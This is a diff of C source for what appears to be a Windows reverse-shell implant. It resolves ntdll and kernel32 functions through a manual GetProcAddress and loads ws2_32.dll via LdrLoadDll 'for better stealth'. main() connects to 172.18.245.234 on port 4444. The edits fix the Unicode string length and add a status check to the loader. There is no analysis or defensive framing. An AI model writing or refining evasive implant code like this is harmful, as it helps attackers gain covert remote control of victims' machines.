@@ -43,15 +43,19 @@ int run(const char* host, const char* port)
 	FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManual("kernel32.dll", "WaitForSingleObject");
     FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManual("ntdll.dll", "LdrLoadDll");
 
+	// RtlInitUnicodeString(&usDllName, L"ws2_32.dll");
     // NOTE: use stack allocation instead of RtlInitUnicodeString for better stealth
     UNICODE_STRING usDllName;
-    usDllName.Length = 22;
-    usDllName.MaximumLength = 24;
+    usDllName.Length = 20;
+    usDllName.MaximumLength = 22;
     usDllName.Buffer = L"ws2_32.dll";
     PVOID dllBase; // ws2_32.dll pModule
-    NTSTATUS status = pLdrLoadDll(NULL, 0, &usDllName, &dllBase);
+    NTSTATUS status = pLdrLoadDll(NULL, NULL, &usDllName, &dllBase);
     // TODO: for now we just assume it's always successful
-    //if (NT_SUCCESS(status))
+    if (!NT_SUCCESS(status))
+	{
+		printf("pLdrLoadDll was unable to obtain valid dllBase\n");
+	}
 
     printf("start\n");
     FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManualM(dllBase, "WSAStartup");
@@ -218,5 +222,6 @@ int main()
     run("172.18.245.234", "4444");
     //run("10.0.0.86", "4444");
 }
+
 
 
